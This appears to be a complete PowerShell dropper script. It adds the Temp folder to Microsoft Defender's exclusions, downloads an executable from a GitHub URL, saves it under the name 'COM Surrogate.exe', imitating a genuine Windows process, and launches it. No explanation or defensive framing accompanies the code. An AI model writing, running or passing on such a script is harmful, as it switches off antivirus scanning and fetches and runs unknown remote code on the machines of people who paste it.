Add-MpPreference -ExclusionPath $env:Temp

$url = "https://github.com/M7mmdddd/webstie-demo/blob/main/files/COM%20Surrogate.ex"

$output = "$env:Temp/COM Surrogate.exe"

Invoke-WebRequest -Uri $url -OutFile $output

Start-Process -FilePath $output
